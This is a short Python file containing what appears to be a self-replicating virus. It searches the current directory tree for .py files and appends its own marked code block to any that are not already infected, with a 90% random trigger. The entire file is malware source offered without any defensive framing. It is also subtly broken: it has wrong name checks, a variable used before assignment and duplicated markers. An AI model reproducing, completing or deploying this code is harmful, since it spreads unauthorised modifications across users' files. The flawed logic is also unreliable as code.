import os
import random
import string

def get_virus_code():
    with open(file, 'r') as f:
        lines = f.readlines()
    virus_code = []
    for line in lines:
        if line == '### START VIRUS ###\n':
            replicate = True
        if replicate:
            virus_code.append(line)
        if line == '### END VIRUS ###\n':
            break
    return ''.join(virus_code)

def find_files_to_infect():
    files_to_infect = []
    for root, dirs, files in os.walk('.'):
        for file in files:
            if file.endswith('.py'):
                with open(os.path.join(root, file), 'r') as f:
                    file_code = f.readlines()
                infected = False
                for line in file_code:
                    if line == '### START VIRUS ###\n':
                        infected = True
                        break
                if not infected:
                    files_to_infect.append(os.path.join(root, file))
    return files_to_infect

def infect(files_to_infect):
    virus_code = get_virus_code()
    for file_to_infect in files_to_infect:
        with open(file_to_infect, 'r') as f:
            file_code = f.readlines()
        with open(file_to_infect, 'w') as f:
            for line in file_code:
                if line == '### END VIRUS ###\n':
                    break
                f.write(line)
            f.write('\n')
            f.write('### START VIRUS ###\n')
            f.write(virus_code)
            f.write('### END VIRUS ###\n')

if name == 'main':
    replicate = False
    if random.randint(1, 100) <= 90:
        replicate = True

    if replicate:
        files_to_infect = find_files_to_infect()
        infect(files_to_infect)
